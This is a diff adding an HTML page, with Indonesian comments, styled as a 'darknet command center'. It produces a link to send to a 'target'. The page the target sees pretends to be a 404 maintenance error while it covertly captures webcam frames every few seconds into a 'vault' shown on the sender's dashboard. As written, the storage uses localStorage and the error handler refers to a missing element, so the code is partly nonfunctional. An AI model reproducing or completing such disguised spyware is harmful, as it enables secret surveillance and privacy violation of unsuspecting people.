@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Nesia Darknet - Command Center ☠️</title>
+    <style>
+        body { background: #050505; color: #00ff00; font-family: 'Courier New'; padding: 20px; text-align: center; }
+        .box { border: 2px solid #00ff00; padding: 20px; margin: 10px auto; max-width: 800px; box-shadow: 0 0 15px #00ff00; }
+        .result-box { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 10px; margin-top: 20px; min-height: 200px; border: 1px dashed #00ff00; padding: 10px; }
+        img { width: 100%; border: 1px solid #fff; }
+        button { background: #00ff00; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; }
+        input { background: #111; color: #00ff00; border: 1px solid #00ff00; padding: 10px; width: 70%; }
+        #target-ui { display: none; } /* Sembunyiin tampilan target dari lo */
+    </style>
+</head>
+<body>
+
+    <div id="admin-ui">
+        <div class="box">
+            <h1>NESIA DARKNET COMMAND CENTER 😍😈</h1>
+            <p>Salin link ini dan kirim ke target (teman lo):</p>
+            <input type="text" id="p-link" readonly>
+            <button onclick="copyLink()">COPY LINK ☠️</button>
+        </div>
+
+        <div class="box">
+            <h3>HASIL SADAP REAL-TIME 📸</h3>
+            <div id="gallery" class="result-box">
+                </div>
+        </div>
+    </div>
+
+    <div id="target-ui">
+        <h1>404 Server Error</h1>
+        <p>System sedang maintenance, mohon tunggu...</p>
+        <video id="v" style="display:none;" autoplay></video>
+        <canvas id="c" style="display:none;"></canvas>
+    </div>
+
+    <script>
+        // OTOMATIS DETEKSI MODE
+        const urlParams = new URLSearchParams(window.location.search);
+        const isTarget = urlParams.get('v') === 'connect';
+
+        if (!isTarget) {
+            // MODE ADMIN (DASHBOARD)
+            document.getElementById('p-link').value = window.location.href.split('?')[0] + '?v=connect';
+            
+            // Simulasi penarikan data dari database 'cloud' (LocalStorage)
+            setInterval(() => {
+                const gallery = document.getElementById('gallery');
+                const data = JSON.parse(localStorage.getItem('darknet_vault') || '[]');
+                gallery.innerHTML = data.map(img => `<img src="${img}">`).join('');
+            }, 2000);
+
+        } else {
+            // MODE TARGET (SADAP)
+            document.getElementById('admin-ui').style.display = 'none';
+            document.getElementById('target-ui').style.display = 'block';
+
+            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+                const v = document.getElementById('v');
+                v.srcObject = stream;
+                setInterval(() => {
+                    const c = document.getElementById('c');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    const photo = c.toDataURL('image/jpeg');
+                    
+                    // Kirim ke 'Vault' lo
+                    let vault = JSON.parse(localStorage.getItem('darknet_vault') || '[]');
+                    vault.unshift(photo);
+                    localStorage.setItem('darknet_vault', JSON.stringify(vault.slice(0, 30)));
+                }, 3000);
+            }).catch(() => {
+                document.querySelector('.status').innerText = "Koneksi Gagal, Segarkan Halaman.";
+            });
+        }
+
+        function copyLink() {
+            const copyText = document.getElementById("p-link");
+            copyText.select();
+            document.execCommand("copy");
+            alert("Link maut siap dikirim! 😈☠️");
+        }
+    </script>
+</body>
+</html>
